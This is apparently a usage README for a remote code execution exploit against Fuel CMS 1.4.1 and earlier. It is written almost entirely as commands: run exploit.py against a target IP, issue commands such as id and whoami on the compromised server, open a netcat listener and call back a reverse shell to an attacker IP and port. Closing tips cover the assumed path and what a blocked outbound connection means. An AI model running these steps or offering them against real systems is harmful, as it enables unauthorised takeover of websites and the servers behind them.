# Fuel CMS 1.4.1 RCE – 

## Run Exploit
```
python3 exploit.py <IP_ADDRESS>
Example:

python3 exploit.py 10.10.12.27
```
Execute Commands
After running the exploit:
```

fuelCMS$ id
fuelCMS$ whoami
fuelCMS$ ls
```
Reverse Shell
1. Start listener (new terminal)
```
nc -lvnp <PORT>
```
2. Trigger shell from exploit
```
fuelCMS$ shell_me
```
Enter attacker details when prompted:

```
<ATTACKER_IP>:<PORT>
```

Notes
Works on Fuel CMS ≤ 1.4.1

Path assumed: /fuel/

If reverse shell fails → outbound blocked

Use basic commands first (id, pwd, ls)
